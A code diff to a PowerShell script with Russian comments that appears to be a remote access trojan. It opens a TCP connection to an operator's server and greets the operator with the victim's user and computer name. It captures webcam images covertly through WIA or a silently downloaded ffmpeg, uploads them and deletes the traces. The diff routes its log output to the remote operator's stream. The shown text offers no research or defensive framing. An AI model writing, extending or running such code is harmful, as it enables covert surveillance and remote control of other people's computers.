@@ -1,4 +1,24 @@
 cmd /c "chcp 65001" | Out-Null
+function Output-Log {
+    param (
+        [string]$message
+    )
+    # Выводим на локальную консоль
+    Write-Host $message
+    # Если активен клиентский поток, отправляем сообщение туда
+    if ($global:clientStream -and $global:clientStream.CanWrite) {
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($message + "`n")
+        try {
+            $global:clientStream.Write($bytes, 0, $bytes.Length)
+            $global:clientStream.Flush()
+        }
+        catch {
+            # При ошибке очистим переменную
+            $global:clientStream = $null
+        }
+    }
+}
+
 
 function Download-Ffmpeg {
     param (
@@ -8,24 +28,24 @@ function Download-Ffmpeg {
         $ffmpegZip = "$env:TEMP\ffmpeg.zip"
         $extractPath = "$env:TEMP\ffmpeg_extracted"
         
-        # Если в каталоге уже есть ffmpeg.exe, то просто вернуть его путь
+        # Если в каталоге уже есть ffmpeg.exe, возвращаем его путь
         $existingFfmpeg = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
         if ($existingFfmpeg) {
-            Write-Host "[+] ffmpeg already downloaded and extracted at: $($existingFfmpeg.FullName)" -ForegroundColor Green
+            Output-Log "[+] ffmpeg already downloaded and extracted at: $($existingFfmpeg.FullName)"
             $global:ffmpegPath = $existingFfmpeg.FullName
             return "[+] ffmpeg downloaded and extracted successfully to: $($existingFfmpeg.FullName)"
         }
         
-        Write-Host "[*] Starting download of ffmpeg from $ffmpegUrl..." -ForegroundColor Cyan
+        Output-Log "[*] Starting download of ffmpeg from $ffmpegUrl..."
         Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip -UseBasicParsing -Verbose
-        Write-Host "[*] Download complete. File saved to: $ffmpegZip" -ForegroundColor Cyan
+        Output-Log "[*] Download complete. File saved to: $ffmpegZip"
         
         if (-not (Test-Path $ffmpegZip)) {
-            Write-Error "[ERROR] Downloaded zip file not found."
+            Output-Log "[ERROR] Downloaded zip file not found."
             return "[ERROR] Downloaded zip file not found."
         }
         
-        Write-Host "[*] Extracting ffmpeg..." -ForegroundColor Cyan
+        Output-Log "[*] Extracting ffmpeg..."
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         if (Test-Path $extractPath) { 
             Remove-Item -Recurse -Force $extractPath 
@@ -33,28 +53,30 @@ function Download-Ffmpeg {
         New-Item -ItemType Directory -Path $extractPath | Out-Null
         [System.IO.Compression.ZipFile]::ExtractToDirectory($ffmpegZip, $extractPath)
         
-        # Разблокируем все извлечённые файлы, если Windows их заблокировала
+        # Разблокируем извлечённые файлы
         Get-ChildItem -Path $extractPath -Recurse | Unblock-File -ErrorAction SilentlyContinue
         
-        Write-Host "[*] Extraction complete. Extracted to: $extractPath" -ForegroundColor Cyan
+        Output-Log "[*] Extraction complete. Extracted to: $extractPath"
         
         # Рекурсивно ищем ffmpeg.exe
         $ffmpegFile = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
         if ($ffmpegFile) {
-            Write-Host "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)" -ForegroundColor Green
+            Output-Log "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)"
             $global:ffmpegPath = $ffmpegFile.FullName
             return "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)"
         }
         else {
-            Write-Error "[ERROR] ffmpeg.exe not found after extraction."
+            Output-Log "[ERROR] ffmpeg.exe not found after extraction."
             return "[ERROR] ffmpeg.exe not found after extraction."
         }
     }
     catch {
-        Write-Error "[ERROR] Failed to download/extract ffmpeg: $($_.Exception.Message)"
+        Output-Log "[ERROR] Failed to download/extract ffmpeg: $($_.Exception.Message)"
         return "[ERROR] Failed to download/extract ffmpeg: $($_.Exception.Message)"
     }
 }
+
+
 
 
 
@@ -293,6 +315,7 @@ function Connect-ZiPo {
                 $img.SaveFile($file)
                 $uploadResult = Upload-File $file
                 Remove-Item $file -Force -ErrorAction SilentlyContinue
+                Output-Log "[*] Image captured via WIA and sent to client."
                 return $uploadResult
             }
             catch {
@@ -300,17 +323,16 @@ function Connect-ZiPo {
             }
         }
         
-        # Если WIA не обнаружила камеру, пробуем использовать ffmpeg (fallback)
+        # Если WIA не обнаружила камеру, пробуем использовать ffmpeg
         if (-not $global:ffmpegPath -or -not (Test-Path $global:ffmpegPath)) {
             $ffmpegPath = "ffmpeg"
-            Write-Host "[*] No camera found via WIA. Checking ffmpeg in PATH..." -ForegroundColor Cyan
+            Output-Log "[*] No camera found via WIA. Checking ffmpeg in PATH..."
             $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
             if ($LASTEXITCODE -ne 0) {
-                Write-Host "[*] ffmpeg not found in PATH. Attempting to download ffmpeg..." -ForegroundColor Cyan
+                Output-Log "[*] ffmpeg not found in PATH. Attempting to download ffmpeg..."
                 $downloadResult = Download-Ffmpeg
-                Write-Host $downloadResult
+                Output-Log $downloadResult
                 if ($downloadResult -match "^\[\+\]") {
-                    # Извлекаем путь к ffmpeg.exe из возвращаемой строки
                     $global:ffmpegPath = ($downloadResult -replace "^\[\+\].+to:\s+","").Trim()
                 }
                 else {
@@ -322,26 +344,24 @@ function Connect-ZiPo {
             }
         }
         
-        Write-Host "[*] Using ffmpeg at: $global:ffmpegPath" -ForegroundColor Cyan
+        Output-Log "[*] Using ffmpeg at: $global:ffmpegPath"
         $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
         $ffmpegExec = $global:ffmpegPath
         
-        # Получаем список устройств через ffmpeg (с live логированием)
+        # Получаем список устройств через ffmpeg
         $cameraOutput = & cmd /c "`"$ffmpegExec`" -list_devices true -f dshow -i dummy" 2>&1
-        Write-Host "[*] ffmpeg device list:" -ForegroundColor Cyan
-        Write-Host $cameraOutput
+        Output-Log "[*] ffmpeg device list:"
+        Output-Log $cameraOutput
         
-        # Ищем строки, содержащие "(video)" – они обычно содержат имя камеры
+        # Ищем имя камеры из строк, содержащих "(video)"
         $cameraName = $null
         $cameraLines = $cameraOutput | Select-String "(video)"
         if ($cameraLines) {
             foreach ($line in $cameraLines) {
-                # Пример строки: "USBCamera" (video)
                 if ($line.ToString() -match '"([^"]+)"\s*\(video\)') {
                     $cameraName = $Matches[1]
                     break
                 }
-                # Если строка вида video=USBCamera (без кавычек)
                 elseif ($line.ToString() -match 'video="?([^"]+)"?\s*\(video\)') {
                     $cameraName = $Matches[1]
                     break
@@ -353,13 +373,11 @@ function Connect-ZiPo {
             return "[ERROR] ffmpeg fallback did not detect any camera."
         }
         
-        Write-Host "[*] Camera detected: $cameraName. Capturing image..." -ForegroundColor Cyan
+        Output-Log "[*] Camera detected: $cameraName. Capturing image..."
         Start-Process -FilePath $ffmpegExec -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
         if (Test-Path $tempImage) {
-            Write-Host "[*] Image captured successfully." -ForegroundColor Cyan
-            # Сохраняем результат отправки снимка
+            Output-Log "[*] Image captured successfully via ffmpeg."
             $uploadResult = Upload-File $tempImage
-            # Удаляем файл-снимок сразу после отправки
             Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
             return $uploadResult
         }
@@ -371,6 +389,7 @@ function Connect-ZiPo {
         return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
@@ -438,6 +457,9 @@ schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
         try {
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
+
+            $global:clientStream = $stream
+            
             [byte[]]$buffer = 0..65535 | % { 0 }
 
             $esc = [char]27
@@ -451,6 +473,7 @@ ${esc}[31m
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|
+                CLIENT CHECK
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
